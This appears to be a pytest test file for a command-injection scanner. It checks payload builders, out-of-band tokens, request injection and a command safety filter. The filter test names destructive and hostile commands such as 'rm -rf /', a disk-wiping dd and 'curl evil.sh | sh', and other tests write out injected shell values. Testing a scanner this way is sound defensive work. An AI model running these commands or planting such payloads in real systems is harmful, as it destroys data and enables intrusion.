import pytest

from execproof.payloads import (
    arithmetic_token,
    build_arithmetic_payloads,
    build_echo_payloads,
    build_time_payloads,
    build_oob_payloads,
    split_injection_points,
    random_token,
)
from execproof.injector import build_request
from execproof.config import is_safe_command
from execproof.models import ScanConfig
from execproof.scanner import Scanner, ScanError


def test_is_safe_command_blocks_destructive():
    for cmd in ["rm -rf /", "dd if=/dev/zero of=/dev/sda", "shutdown now", "curl evil.sh | sh",
                "nmap -sS target"]:
        assert not is_safe_command(cmd), cmd


def test_is_safe_command_allows_probes():
    for cmd in ["echo abc", "sleep 5", "nslookup t.oob.test", "ping -c 1 t.oob.test"]:
        assert is_safe_command(cmd), cmd


def test_arithmetic_payload_roundtrip():
    n, expected = arithmetic_token()
    assert int(n) * 2 == int(expected)
    assert any(n in p and expected not in p for p in build_arithmetic_payloads(n))


def test_echo_pair_payload_has_nested_markers():
    built, (a, b) = build_echo_payloads()
    assert any(f"echo {a}$(echo {b})" in tpl for _, tpl in built)
    assert a != b


def test_time_payloads_use_sleep():
    built = build_time_payloads(6)
    assert any("sleep 6" in tpl for _, tpl in built)
    assert len(built) >= 8


def test_oob_payloads_include_token():
    built = build_oob_payloads("oob.example.test", "rho_abc")
    assert any("rho_abc.oob.example.test" in tpl for _, tpl in built)


def test_random_token_unique():
    assert random_token() != random_token()


def test_split_injection_points_query_and_json():
    points = split_injection_points("http://t/a?host=x&page=1", '{"user":"bob"}', None)
    kinds = {(p["kind"], p["name"]) for p in points}
    assert ("query", "host") in kinds
    assert ("query", "page") in kinds
    assert ("json", "user") in kinds


def test_build_request_query_injection():
    url, data = build_request("http://t/a?host=8.8.8.8", None,
                              {"kind": "query", "name": "host", "original": "8.8.8.8"},
                              "; sleep 5 ;")
    assert "host=%3B+sleep+5+%3B" in url or "host=%3B%20sleep%205%20%3B" in url
    assert data is None


def test_build_request_json_injection():
    _, data = build_request("http://t/a", '{"user":"bob"}',
                            {"kind": "json", "name": "user", "original": "bob"},
                            "x$(y)")
    assert data == '{"user": "x$(y)"}'


def test_scanner_rejects_bad_url():
    cfg = ScanConfig(url="ftp://nope")
    with pytest.raises(ScanError):
        Scanner(cfg)


def test_scan_config_defaults():
    cfg = ScanConfig(url="http://t")
    assert cfg.rate > 0
    assert cfg.confirmations >= 1
